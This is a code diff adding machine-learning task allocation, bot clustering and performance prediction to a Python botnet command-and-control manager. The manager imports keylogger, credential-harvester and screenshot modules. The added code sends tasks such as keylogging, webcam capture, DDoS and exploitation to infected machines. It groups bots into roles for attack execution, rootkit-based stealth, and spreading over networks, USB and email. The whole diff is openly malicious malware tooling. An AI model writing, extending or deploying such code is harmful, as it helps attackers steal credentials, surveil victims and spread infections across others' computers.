@@ -14,7 +14,17 @@ from collections import defaultdict
 import random
 from itertools import islice
 
-from payload.modules.keylogger import Keylogger
+# AI Imports
+import numpy as np
+from sklearn.ensemble import RandomForestClassifier
+from sklearn.cluster import KMeans
+from sklearn.preprocessing import StandardScaler
+from sklearn.neural_network import MLPRegressor
+from sklearn.decomposition import PCA
+import joblib
+import psutil
+
+from payload.modules.keylogger import SmartKeylogger as Keylogger
 from payload.modules.credential_harvester import CredentialHarvester
 from payload.modules.data_harvester import DataHarvester
 from payload.modules.screenshot import ScreenshotCapture
@@ -90,6 +100,19 @@ class BotnetManager:
         # Task coordination
         self.coordinator_loop = asyncio.new_event_loop()
         self.session = aiohttp.ClientSession()
+        
+        # AI Components
+        self.ai_task_allocator = None
+        self.ai_performance_predictor = None
+        self.ai_bot_clusterer = None
+        self.ai_scaler = StandardScaler()
+        self.ai_pca = PCA(n_components=10)
+        self.task_history = []
+        self.performance_history = []
+        self.allocation_patterns = defaultdict(list)
+        
+        # Initialize AI models
+        self._init_ai_models()
         
         # Start background tasks
         self._start_background_tasks()
@@ -1266,3 +1289,516 @@ class BotnetManager:
                 
         # Cleanup resources
         self.executor.shutdown()
+
+    def _init_ai_models(self):
+        """Initialize AI models for botnet management"""
+        try:
+            # Task allocation AI
+            self.ai_task_allocator = RandomForestClassifier(
+                n_estimators=100,
+                max_depth=10,
+                random_state=42
+            )
+            
+            # Performance prediction AI
+            self.ai_performance_predictor = MLPRegressor(
+                hidden_layer_sizes=(100, 50),
+                max_iter=1000,
+                random_state=42
+            )
+            
+            # Bot clustering AI
+            self.ai_bot_clusterer = KMeans(
+                n_clusters=5,
+                random_state=42
+            )
+            
+            self.logger.info("AI models initialized successfully")
+            
+        except Exception as e:
+            self.logger.error(f"Failed to initialize AI models: {e}")
+    
+    def _extract_bot_features(self, bot: Bot) -> np.ndarray:
+        """Extract features from bot for AI analysis"""
+        try:
+            features = []
+            
+            # Performance metrics
+            metrics = self.bot_metrics[bot.id]
+            features.extend([
+                metrics['success_rate'],
+                metrics['response_time'],
+                metrics['cpu_usage'],
+                metrics['memory_usage']
+            ])
+            
+            # Capability features
+            capabilities = bot.capabilities
+            features.extend([
+                int(capabilities.get('keylogger', False)),
+                int(capabilities.get('screenshot', False)),
+                int(capabilities.get('webcam', False)),
+                int(capabilities.get('file_access', False)),
+                int(capabilities.get('network_scan', False)),
+                int(capabilities.get('privilege_escalation', False))
+            ])
+            
+            # System features
+            features.extend([
+                hash(bot.os or '') % 1000 / 1000.0,  # OS hash normalized
+                hash(bot.arch or '') % 1000 / 1000.0,  # Arch hash normalized
+                len(bot.tasks),
+                bot.score / 100.0 if bot.score > 0 else 0.0,
+                (datetime.now() - bot.last_seen).total_seconds() / 3600.0  # Hours since last seen
+            ])
+            
+            # Network position features
+            if bot.id in self.graph:
+                features.extend([
+                    self.graph.degree(bot.id),
+                    nx.betweenness_centrality(self.graph).get(bot.id, 0.0),
+                    nx.closeness_centrality(self.graph).get(bot.id, 0.0)
+                ])
+            else:
+                features.extend([0.0, 0.0, 0.0])
+            
+            return np.array(features)
+            
+        except Exception as e:
+            self.logger.error(f"Failed to extract bot features: {e}")
+            return np.zeros(18)  # Default feature vector
+    
+    def _extract_task_features(self, task: Dict) -> np.ndarray:
+        """Extract features from task for AI analysis"""
+        try:
+            features = []
+            
+            # Task type encoding
+            task_types = ['keylog', 'screenshot', 'webcam', 'file_harvest', 'ddos', 'scan', 'exploit']
+            task_type = task.get('type', '')
+            task_encoding = [1.0 if task_type == t else 0.0 for t in task_types]
+            features.extend(task_encoding)
+            
+            # Task properties
+            features.extend([
+                task.get('priority', 1) / 10.0,
+                len(task.get('params', {})),
+                int(task.get('stealth_required', False)),
+                int(task.get('persistence_required', False)),
+                task.get('estimated_duration', 60) / 3600.0  # Hours
+            ])
+            
+            return np.array(features)
+            
+        except Exception as e:
+            self.logger.error(f"Failed to extract task features: {e}")
+            return np.zeros(12)  # Default feature vector
+    
+    def ai_allocate_task(self, task: Dict) -> List[str]:
+        """Use AI to allocate task to optimal bots"""
+        try:
+            if not self.bots:
+                return []
+            
+            # Extract task features
+            task_features = self._extract_task_features(task)
+            
+            # Get bot scores for this task
+            bot_scores = []
+            bot_ids = []
+            
+            for bot_id, bot in self.bots.items():
+                if bot.status != 'active':
+                    continue
+                
+                # Extract bot features
+                bot_features = self._extract_bot_features(bot)
+                
+                # Combine task and bot features
+                combined_features = np.concatenate([task_features, bot_features])
+                
+                # Predict performance score
+                if hasattr(self.ai_performance_predictor, 'predict') and len(self.performance_history) > 10:
+                    try:
+                        score = self.ai_performance_predictor.predict([combined_features])[0]
+                    except:
+                        score = self._calculate_traditional_score(bot, task)
+                else:
+                    score = self._calculate_traditional_score(bot, task)
+                
+                bot_scores.append(score)
+                bot_ids.append(bot_id)
+            
+            if not bot_scores:
+                return []
+            
+            # Select top bots based on scores
+            num_bots = min(task.get('bot_count', 1), len(bot_ids))
+            top_indices = np.argsort(bot_scores)[-num_bots:]
+            
+            selected_bots = [bot_ids[i] for i in top_indices]
+            
+            # Record allocation pattern for learning
+            self.allocation_patterns[task.get('type', 'unknown')].append({
+                'task_features': task_features,
+                'selected_bots': selected_bots,
+                'scores': [bot_scores[i] for i in top_indices]
+            })
+            
+            return selected_bots
+            
+        except Exception as e:
+            self.logger.error(f"AI task allocation failed: {e}")
+            return self._fallback_allocate_task(task)
+    
+    def _calculate_traditional_score(self, bot: Bot, task: Dict) -> float:
+        """Traditional scoring method as fallback"""
+        score = 0.0
+        
+        # Base score from bot metrics
+        metrics = self.bot_metrics[bot.id]
+        score += metrics['success_rate'] * 50
+        score += max(0, 10 - metrics['response_time']) * 5
+        score += max(0, 100 - metrics['cpu_usage']) * 0.1
+        score += max(0, 100 - metrics['memory_usage']) * 0.1
+        
+        # Capability matching
+        task_type = task.get('type', '')
+        if task_type in bot.capabilities and bot.capabilities[task_type]:
+            score += 30
+        
+        # Load balancing
+        current_load = len(bot.tasks)
+        score -= current_load * 5
+        
+        return max(0, score)
+    
+    def _fallback_allocate_task(self, task: Dict) -> List[str]:
+        """Fallback allocation method when AI fails"""
+        available_bots = [
+            (bot_id, self._calculate_traditional_score(bot, task))
+            for bot_id, bot in self.bots.items()
+            if bot.status == 'active'
+        ]
+        
+        if not available_bots:
+            return []
+        
+        # Sort by score and select top bots
+        available_bots.sort(key=lambda x: x[1], reverse=True)
+        num_bots = min(task.get('bot_count', 1), len(available_bots))
+        
+        return [bot_id for bot_id, _ in available_bots[:num_bots]]
+    
+    def ai_optimize_botnet_performance(self):
+        """Use AI to optimize overall botnet performance"""
+        try:
+            if len(self.bots) < 5:
+                return
+            
+            # Extract all bot features
+            bot_features = []
+            bot_ids = []
+            
+            for bot_id, bot in self.bots.items():
+                if bot.status == 'active':
+                    features = self._extract_bot_features(bot)
+                    bot_features.append(features)
+                    bot_ids.append(bot_id)
+            
+            if len(bot_features) < 3:
+                return
+            
+            bot_features = np.array(bot_features)
+            
+            # Cluster bots for specialized roles
+            if len(bot_features) >= 5:
+                try:
+                    clusters = self.ai_bot_clusterer.fit_predict(bot_features)
+                    self._assign_specialized_roles(bot_ids, clusters)
+                except Exception as e:
+                    self.logger.error(f"Bot clustering failed: {e}")
+            
+            # Optimize task distribution
+            self._ai_rebalance_tasks()
+            
+            # Update bot scores based on performance
+            self._ai_update_bot_scores()
+            
+            self.logger.info("AI botnet optimization completed")
+            
+        except Exception as e:
+            self.logger.error(f"AI optimization failed: {e}")
+    
+    def _assign_specialized_roles(self, bot_ids: List[str], clusters: np.ndarray):
+        """Assign specialized roles to bots based on clustering"""
+        try:
+            role_mapping = {
+                0: 'data_collector',
+                1: 'network_scanner',
+                2: 'attack_executor',
+                3: 'stealth_operator',
+                4: 'propagation_agent'
+            }
+            
+            for bot_id, cluster in zip(bot_ids, clusters):
+                if bot_id in self.bots:
+                    role = role_mapping.get(cluster, 'general')
+                    self.bots[bot_id].tags.add(f"role:{role}")
+                    
+                    # Adjust bot capabilities based on role
+                    self._optimize_bot_for_role(bot_id, role)
+            
+        except Exception as e:
+            self.logger.error(f"Role assignment failed: {e}")
+    
+    def _optimize_bot_for_role(self, bot_id: str, role: str):
+        """Optimize bot configuration for specific role"""
+        try:
+            bot = self.bots[bot_id]
+            
+            if role == 'data_collector':
+                # Prioritize data collection capabilities
+                priority_caps = ['keylogger', 'screenshot', 'credential_harvester', 'file_access']
+            elif role == 'network_scanner':
+                # Prioritize network capabilities
+                priority_caps = ['network_scan', 'port_scan', 'vulnerability_scan']
+            elif role == 'attack_executor':
+                # Prioritize attack capabilities
+                priority_caps = ['ddos', 'exploit', 'lateral_movement']
+            elif role == 'stealth_operator':
+                # Prioritize stealth capabilities
+                priority_caps = ['anti_detection', 'process_migration', 'rootkit']
+            elif role == 'propagation_agent':
+                # Prioritize spreading capabilities
+                priority_caps = ['network_spread', 'usb_spread', 'email_spread']
+            else:
+                priority_caps = []
+            
+            # Update bot priority scores for role-specific tasks
+            for cap in priority_caps:
+                if cap in bot.capabilities:
+                    bot.score += 10
+                    
+        except Exception as e:
+            self.logger.error(f"Bot optimization failed: {e}")
+    
+    def _ai_rebalance_tasks(self):
+        """Rebalance tasks using AI insights"""
+        try:
+            # Get overloaded bots
+            overloaded_bots = [
+                bot_id for bot_id, load in self.bot_loads.items()
+                if load > 3 and bot_id in self.bots
+            ]
+            
+            # Get underutilized bots
+            underutilized_bots = [
+                bot_id for bot_id, bot in self.bots.items()
+                if self.bot_loads[bot_id] < 1 and bot.status == 'active'
+            ]
+            
+            # Redistribute tasks
+            for overloaded_bot in overloaded_bots:
+                if underutilized_bots:
+                    bot = self.bots[overloaded_bot]
+                    if bot.tasks:
+                        # Move lowest priority task to underutilized bot
+                        task_to_move = min(bot.tasks, key=lambda t: t.get('priority', 1))
+                        target_bot = underutilized_bots[0]
+                        
+                        # AI-assisted task migration
+                        if self._ai_can_handle_task(target_bot, task_to_move):
+                            self._migrate_task(overloaded_bot, target_bot, task_to_move)
+                            underutilized_bots.pop(0)
+                            
+        except Exception as e:
+            self.logger.error(f"Task rebalancing failed: {e}")
+    
+    def _ai_can_handle_task(self, bot_id: str, task: Dict) -> bool:
+        """Use AI to determine if bot can handle task"""
+        try:
+            bot = self.bots[bot_id]
+            task_type = task.get('type', '')
+            
+            # Check basic capability
+            if not bot.capabilities.get(task_type, False):
+                return False
+            
+            # AI-based compatibility check
+            bot_features = self._extract_bot_features(bot)
+            task_features = self._extract_task_features(task)
+            combined_features = np.concatenate([task_features, bot_features])
+            
+            # Predict success probability
+            if hasattr(self.ai_performance_predictor, 'predict') and len(self.performance_history) > 10:
+                try:
+                    success_prob = self.ai_performance_predictor.predict([combined_features])[0]
+                    return success_prob > 0.6  # 60% success threshold
+                except:
+                    pass
+            
+            # Fallback to traditional check
+            return self._traditional_capability_check(bot, task)
+            
+        except Exception as e:
+            self.logger.error(f"AI capability check failed: {e}")
+            return False
+    
+    def _traditional_capability_check(self, bot: Bot, task: Dict) -> bool:
+        """Traditional capability checking method"""
+        task_type = task.get('type', '')
+        
+        # Basic capability check
+        if not bot.capabilities.get(task_type, False):
+            return False
+        
+        # Performance history check
+        metrics = self.bot_metrics[bot.id]
+        if metrics['success_rate'] < 0.3:  # 30% minimum success rate
+            return False
+        
+        # Load check
+        if len(bot.tasks) >= 5:  # Maximum 5 concurrent tasks
+            return False
+        
+        return True
+    
+    def _migrate_task(self, from_bot: str, to_bot: str, task: Dict):
+        """Migrate task between bots"""
+        try:
+            # Remove from source bot
+            self.bots[from_bot].tasks.remove(task)
+            self.bot_loads[from_bot] -= 1
+            
+            # Add to target bot
+            task['bot_id'] = to_bot
+            self.bots[to_bot].tasks.append(task)
+            self.bot_loads[to_bot] += 1
+            
+            self.logger.info(f"Migrated task {task['id']} from {from_bot} to {to_bot}")
+            
+        except Exception as e:
+            self.logger.error(f"Task migration failed: {e}")
+    
+    def _ai_update_bot_scores(self):
+        """Update bot scores using AI analysis"""
+        try:
+            for bot_id, bot in self.bots.items():
+                if bot.status != 'active':
+                    continue
+                
+                # Get current metrics
+                metrics = self.bot_metrics[bot_id]
+                
+                # Calculate AI-enhanced score
+                features = self._extract_bot_features(bot)
+                
+                # Base score from metrics
+                score = (
+                    metrics['success_rate'] * 40 +
+                    max(0, 20 - metrics['response_time']) * 2 +
+                    max(0, 100 - metrics['cpu_usage']) * 0.3 +
+                    max(0, 100 - metrics['memory_usage']) * 0.3
+                )
+                
+                # AI enhancement factor
+                try:
+                    if len(features) > 0:
+                        # Normalize features for scoring
+                        normalized_features = self.ai_scaler.fit_transform([features])[0]
+                        ai_factor = np.mean(normalized_features) * 20
+                        score += ai_factor
+                except:
+                    pass
+                
+                # Network position bonus
+                if bot_id in self.graph:
+                    centrality = nx.betweenness_centrality(self.graph).get(bot_id, 0)
+                    score += centrality * 30
+                
+                # Update bot score
+                bot.score = max(0, min(100, int(score)))
+                
+        except Exception as e:
+            self.logger.error(f"AI score update failed: {e}")
+    
+    def ai_train_models(self):
+        """Train AI models with collected data"""
+        try:
+            if len(self.task_history) < 50:
+                return  # Need more data
+            
+            # Prepare training data
+            X_task = []
+            X_perf = []
+            y_success = []
+            y_performance = []
+            
+            for record in self.task_history[-1000:]:  # Use last 1000 records
+                task_features = record.get('task_features', [])
+                bot_features = record.get('bot_features', [])
+                success = record.get('success', False)
+                performance = record.get('performance_score', 0.0)
+                
+                if len(task_features) > 0 and len(bot_features) > 0:
+                    combined_features = np.concatenate([task_features, bot_features])
+                    X_task.append(combined_features)
+                    X_perf.append(combined_features)
+                    y_success.append(int(success))
+                    y_performance.append(performance)
+            
+            if len(X_task) < 20:
+                return
+            
+            X_task = np.array(X_task)
+            X_perf = np.array(X_perf)
+            y_success = np.array(y_success)
+            y_performance = np.array(y_performance)
+            
+            # Train task allocation model
+            try:
+                self.ai_task_allocator.fit(X_task, y_success)
+                self.logger.info("Task allocation model trained")
+            except Exception as e:
+                self.logger.error(f"Task allocation training failed: {e}")
+            
+            # Train performance prediction model
+            try:
+                self.ai_performance_predictor.fit(X_perf, y_performance)
+                self.logger.info("Performance prediction model trained")
+            except Exception as e:
+                self.logger.error(f"Performance prediction training failed: {e}")
+            
+            # Save models
+            self._save_ai_models()
+            
+        except Exception as e:
+            self.logger.error(f"AI training failed: {e}")
+    
+    def _save_ai_models(self):
+        """Save trained AI models"""
+        try:
+            if hasattr(self, 'ai_task_allocator'):
+                joblib.dump(self.ai_task_allocator, 'ai_task_allocator.pkl')
+            if hasattr(self, 'ai_performance_predictor'):
+                joblib.dump(self.ai_performance_predictor, 'ai_performance_predictor.pkl')
+            if hasattr(self, 'ai_bot_clusterer'):
+                joblib.dump(self.ai_bot_clusterer, 'ai_bot_clusterer.pkl')
+                
+        except Exception as e:
+            self.logger.error(f"Model saving failed: {e}")
+    
+    def _load_ai_models(self):
+        """Load saved AI models"""
+        try:
+            import os
+            if os.path.exists('ai_task_allocator.pkl'):
+                self.ai_task_allocator = joblib.load('ai_task_allocator.pkl')
+            if os.path.exists('ai_performance_predictor.pkl'):
+                self.ai_performance_predictor = joblib.load('ai_performance_predictor.pkl')
+            if os.path.exists('ai_bot_clusterer.pkl'):
+                self.ai_bot_clusterer = joblib.load('ai_bot_clusterer.pkl')
+                
+        except Exception as e:
+            self.logger.error(f"Model loading failed: {e}")
